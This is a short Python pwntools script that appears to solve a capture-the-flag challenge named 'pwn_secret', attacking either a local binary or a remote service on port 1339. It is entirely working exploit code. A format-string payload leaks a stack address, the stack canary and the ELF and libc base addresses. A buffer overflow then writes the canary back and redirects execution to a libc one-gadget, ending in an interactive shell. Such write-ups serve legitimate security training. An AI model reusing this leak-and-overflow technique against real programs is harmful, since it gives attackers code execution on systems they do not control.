#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./pwn_secret')
else:
    s = remote('206.81.24.129', 1339)

payload = ''
for i in range(4):
    payload += '%{}$p,'.format(i + 14)
s.sendlineafter('Name: ', payload)
s.recvuntil('Hillo ')
res = s.recvline(False).split(',')
stack_addr = int(res[0], 0x10)
log.info('stack address: %#x' % stack_addr)
canary = int(res[1], 0x10)
log.info('canary: %#x' % canary)
elf_base = int(res[2], 0x10) - 0xc40
log.info('elf base: %#x' % elf_base)
libc_base = int(res[3], 0x10) - 0x20830
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
payload = ''
payload += 'A' * 0x88
payload += p64(canary)
payload += 'A' * 8
payload += p64(libc_base + one_gadgets[0])

s.sendlineafter('Phrase: ', payload)

s.recvuntil('same!\n')

s.interactive()
